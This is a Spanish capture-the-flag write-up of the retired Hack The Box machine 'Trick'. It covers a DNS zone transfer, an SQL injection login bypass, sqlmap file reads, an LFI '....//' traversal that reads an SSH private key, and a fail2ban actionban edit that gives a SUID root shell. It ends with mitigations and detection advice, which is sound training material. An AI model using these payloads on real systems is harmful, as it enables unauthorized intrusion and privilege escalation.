---
machine: Trick
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, sqli, lfi, fail2ban]
---

# Trick — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, ficha publicable.
> Ficha de referencia basada en documentación pública y writeups técnicos. Sin flags ni credenciales reales.

## TL;DR

La máquina expone DNS, SMTP y Nginx. Una transferencia de zona revela `preprod-payroll.trick.htb`, un portal con una inyección SQL que permite autenticarse y leer ficheros. La configuración de Nginx revela un segundo vhost, `preprod-marketing.trick.htb`, con un LFI que filtra `../`. El bypass `....//` permite leer la clave SSH de `michael`. `michael` puede reiniciar `fail2ban` como root y pertenece al grupo `security`, propietario de `action.d`; modificar `actionban` y provocar un baneo ejecuta comandos como root.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh    OpenSSH 7.9p1 Debian
25/tcp  smtp   Postfix
53/tcp  domain ISC BIND 9.11.5-P4
80/tcp  http   nginx 1.14.2
```

La consulta inversa de DNS devuelve `trick.htb`. Se añade al archivo de hosts junto con los vhosts que aparezcan.

## Enumeración

```bash
dig @trick.htb trick.htb AXFR
```

La transferencia de zona devuelve `preprod-payroll.trick.htb`. El portal muestra un login de gestión de nóminas.

```bash
wfuzz -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
```

## Foothold

El login es vulnerable a una inyección SQL de autenticación (**CVE-2022-28468**):

```text
usuario: ' OR 1=1-- -
password: cualquier valor
```

Con `sqlmap` se confirma la inyección y se leen ficheros. La configuración de Nginx revela el docroot de otro vhost:

```bash
sqlmap -r login.req --batch --file-read=/etc/nginx/sites-enabled/default
```

El segundo sitio es `preprod-marketing.trick.htb`. Su `index.php` incluye `page` y elimina las cadenas `../` con `str_replace`, una sola vez. El bypass `....//` reconstruye el traversal tras el filtro:

```text
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
```

La clave privada se copia, se ajustan permisos y se entra por SSH como `michael`. La ruta alternativa es envenenar el correo o el log de Nginx y usar el LFI para ejecutar PHP.

## Movimiento lateral

`michael` es el usuario final de la web; no hace falta pivotar. La enumeración local busca permisos y grupos:

```bash
id
sudo -l
find / -group security 2>/dev/null
```

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
(root) NOPASSWD: /etc/init.d/fail2ban restart
/etc/fail2ban/action.d
```

## Escalada de privilegios

El directorio `/etc/fail2ban/action.d` es escribible por el grupo `security`. La acción por defecto del jail SSH es `iptables-multiport`, cuyo `actionban` se ejecuta como root cuando una IP alcanza el umbral de fallos.

Se reemplaza `actionban` por una orden que crea una copia SUID de bash:

```text
actionban = cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

Se reinicia el servicio con el permiso de sudo y se provocan cinco fallos de autenticación SSH para disparar el baneo:

```bash
sudo /etc/init.d/fail2ban restart
ssh baduser@trick.htb   # repetir hasta el baneo
/tmp/rootbash -p
```

La shell conserva el euid de root. La clave es que `fail2ban` ejecuta la acción con sus privilegios y el usuario controla el fichero de acción.

## Evidencia

- Salida de `dig AXFR` con los vhosts.
- Petición SQLi y captura de la lectura de `/etc/nginx/sites-enabled/default`.
- `sudo -l` y `ls -ld /etc/fail2ban/action.d`.
- `id` dentro de `/tmp/rootbash -p`.

## Lecciones aprendidas

- Una transferencia de zona DNS sigue siendo una fuente de vhosts en laboratorios y redes mal segmentadas.
- Los filtros que eliminan `../` una sola vez se bypassan con `....//`.
- Un permiso de `sudo` para reiniciar un servicio es peligroso si el usuario puede modificar su configuración.
- La pertenencia a un grupo con escritura sobre `action.d` convierte `fail2ban` en ejecución como root.

## Mitigaciones y detección

- **Corrección:** restringir AXFR a servidores secundarios; parametrizar las consultas SQL; usar `realpath` y lista blanca para las plantillas; no permitir que `michael` escriba en `action.d`; revisar los permisos de `sudo` sobre servicios.
- **Detección:** consultas AXFR desde hosts no autorizados; intentos de login con comillas y comentarios SQL; lecturas de `id_rsa` o de la configuración de Nginx; cambios en `action.d` y reinicios de `fail2ban`; creación de binarios SUID en `/tmp`.
- MITRE ATT&CK: T1590.002 (DNS), T1190 (exploit public-facing application), T1548.001 (setuid/setgid), T1543.002 (systemd service).

## Referencias

- <https://www.hackthebox.com/machines/trick>
- <https://0xdf.gitlab.io/2022/10/29/htb-trick.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-28468>
- <https://github.com/fail2ban/fail2ban/wiki>
